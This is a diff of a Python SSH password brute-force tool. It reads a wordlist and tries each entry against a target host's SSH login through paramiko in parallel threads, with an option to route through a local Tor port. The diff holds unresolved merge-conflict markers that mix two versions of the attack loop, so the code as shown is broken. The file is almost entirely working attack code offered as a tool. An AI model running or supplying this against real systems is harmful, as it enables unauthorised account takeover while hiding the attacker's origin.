@@ -53,10 +53,14 @@ def exit_handler():
 
 
 def ssh_connect(password, code = 0):
+<<<<<<< 0ae3ce11cd6e963a8714a906dff61026d73ee413
 	global verbose
 	if (password=="^^^break^^^"):
 		raise notfound
 		sys.exit(1)
+=======
+	global running, verbose
+>>>>>>> Switched from optparse to argparse, cleaned up command line options, added verbose option
 	paramiko.util.log_to_file(".logs/paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -65,10 +69,17 @@ def ssh_connect(password, code = 0):
 	try:
 		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password, timeout=10)
 	except paramiko.AuthenticationException:
+<<<<<<< 0ae3ce11cd6e963a8714a906dff61026d73ee413
 		if verbose == True:
 			print(' [-] Password ' + password + ' incorrect.')
 		ssh.close()
 		sys.exit(1)
+=======
+		running -= 1
+		if verbose == True:
+			print(' [-] Password ' + password + ' incorrect.')
+		return running
+>>>>>>> Switched from optparse to argparse, cleaned up command line options, added verbose option
 	except socket.error as e:
 		print(' [-] Socket error. Retrying...')
 		ssh_connect(password)
@@ -109,11 +120,20 @@ def main():
 	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
 	parser.add_argument('tgtUser', type=str, help='target username')
 	parser.add_argument('dictFile', type=str, help='dictionary file or password list to use')
+<<<<<<< 0ae3ce11cd6e963a8714a906dff61026d73ee413
 	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 16)', default=4)
 	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
 	parser.add_argument('-v', '--verbose', action="store_true", help='display status at each step')
 	args = parser.parse_args()
 	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, worker
+=======
+	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 10)', default=4)
+	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
+	parser.add_argument('-v', '--verbose', action="store_true", help='display status at each step')
+	args = parser.parse_args()
+	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, running
+	running = 0
+>>>>>>> Switched from optparse to argparse, cleaned up command line options, added verbose option
 	tgtUser = args.tgtUser
 	dictFile = args.dictFile
 	tgtPort = args.tgtPort
@@ -127,9 +147,15 @@ def main():
 			print(" [-] Cannot resolve '%s': Unknown host\n" % args.tgtHost)
 			exit(0)
 	torPort = args.torPort
+<<<<<<< 0ae3ce11cd6e963a8714a906dff61026d73ee413
 	if (args.maxThreads > 16):
 		print(' [-] Maximum number of threads can not exceed 16.')
 		maxThreads = 16
+=======
+	if (args.maxThreads > 10):
+		print(' [-] Maximum number of threads can not exceed 10.')
+		maxThreads = 10
+>>>>>>> Switched from optparse to argparse, cleaned up command line options, added verbose option
 	elif (args.maxThreads < 1):
 		print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
 		maxThreads = 4
@@ -163,6 +189,7 @@ def main():
 	running = 0
 	password = []
 	for j in input_file.readlines():
+<<<<<<< 0ae3ce11cd6e963a8714a906dff61026d73ee413
 		password.append(j.strip('\n'))
 	password.append("^^^break^^^")
 	print("\n [+] Let's hack the Gibson.\n")
@@ -179,6 +206,18 @@ def main():
 		worker.close()
 		worker.join()
 
+=======
+		password = j.strip('\n')
+		q.put(password)
+	print("\n [+] Let's hack the Gibson.\n")
+	while (q.qsize() > 0):
+		if running < maxThreads:
+			running += 1
+			passW = q.get()
+			worker = Thread(target=ssh_connect, args=(passW,))
+			worker.start()
+			sleep(1.25) #allow time for ssh banners to be properly captured, if the delay is too short it causes read errors which can cause the script to skip submitting some passwords
+>>>>>>> Switched from optparse to argparse, cleaned up command line options, added verbose option
 	print(' [+] Reached end of dictionary file, waiting for threads to complete...')
 	sleep(1)
 	print(' [+] Password not found; Shutting down.')
